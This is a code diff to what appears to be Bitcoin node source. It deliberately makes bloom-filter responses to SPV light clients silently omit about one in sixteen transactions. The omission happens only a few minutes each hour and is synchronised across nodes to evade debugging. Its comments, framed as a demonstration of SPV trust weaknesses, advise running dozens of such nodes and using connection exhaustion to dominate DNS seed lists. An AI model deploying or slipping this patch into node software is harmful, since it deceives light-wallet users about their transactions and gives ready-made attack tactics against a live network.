@@ -2608,7 +2608,27 @@ CMerkleBlock::CMerkleBlock(const CBlock& block, CBloomFilter& filter)
     for (unsigned int i = 0; i < block.vtx.size(); i++)
     {
         uint256 hash = block.vtx[i].GetHash();
-        if (filter.IsRelevantAndUpdate(block.vtx[i], hash))
+
+        // Demonstrate how SPV clients using bloom filters are trusting
+        // unauthenticated blockchain data provided by untrusted peers.
+        //
+        // Deterministicly ignore 1/16th of all transactions, but only for
+        // about four minutes every hour to make debugging difficult. Using
+        // GetAdjustedTime() helps ensure that all attacking peers attack in a
+        // co-ordinated way, maximizing the chance that a given SPV client will
+        // have all peers simultaneously attack them and they never learn about
+        // the transaction at all.
+        //
+        // Most (all?) SPV implementations based on bitcoinj trust the DNS
+        // seeds completely and don't do any other peer discovery; an attacker
+        // wanting to maximize their chance of success should run a dozen or
+        // two of these attacking nodes and then use techniques like connection
+        // exhaustion and the bloom io attack to push their attacking nodes to
+        // the top of the DNS seed lists.
+        //
+        // Moral of the story: Don't take unauthenticated candy from strangers.
+        if (((hash & 0xf) != 0) && ((GetAdjustedTime() & 0xf00) != 0)
+            && filter.IsRelevantAndUpdate(block.vtx[i], hash))
         {
             vMatch.push_back(true);
             vMatchedTxn.push_back(make_pair(i, hash));
@@ -3840,7 +3860,9 @@ bool static ProcessMessage(CNode* pfrom, string strCommand, CDataStream& vRecv)
             CTransaction tx;
             bool fInMemPool = mempool.lookup(hash, tx);
             if (!fInMemPool) continue; // another thread removed since queryHashes, maybe...
-            if ((pfrom->pfilter && pfrom->pfilter->IsRelevantAndUpdate(tx, hash)) ||
+            if ((pfrom->pfilter
+                && ((hash & 0xf) != 0) && ((GetAdjustedTime() & 0xf00) != 0)
+                && pfrom->pfilter->IsRelevantAndUpdate(tx, hash)) ||
                (!pfrom->pfilter))
                 vInv.push_back(inv);
             if (vInv.size() == MAX_INV_SZ) {
